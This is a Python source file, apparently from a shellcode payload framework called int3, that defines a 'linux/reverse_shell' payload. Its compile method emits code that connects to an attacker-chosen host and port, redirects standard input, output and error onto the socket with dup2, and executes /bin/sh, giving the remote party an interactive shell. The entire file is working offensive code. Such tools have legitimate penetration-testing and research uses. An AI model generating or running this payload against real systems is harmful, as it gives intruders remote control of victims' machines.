from dataclasses import dataclass

from int3.emission import LinuxEmitter
from int3.registers import Registers

from .payload import Payload


@dataclass
class LinuxReverseShell(Payload[Registers]):
    host: str
    port: int

    shell: str = "/bin/sh"

    @classmethod
    def name(cls) -> str:
        return "linux/reverse_shell"

    def compile(self) -> str:
        emitter = LinuxEmitter[Registers].get_emitter(self.ctx.architecture, self.ctx)

        with emitter.error_handler("syscall_failed"):
            sock_reg = emitter.net_open_connection(ip_addr=self.host, port=self.port)

            for i in range(3):
                emitter.dup2(sock_reg, i)

            emitter.execve(self.shell.encode())

        emitter.label("syscall_failed")
        emitter.exit(0)

        return str(emitter)
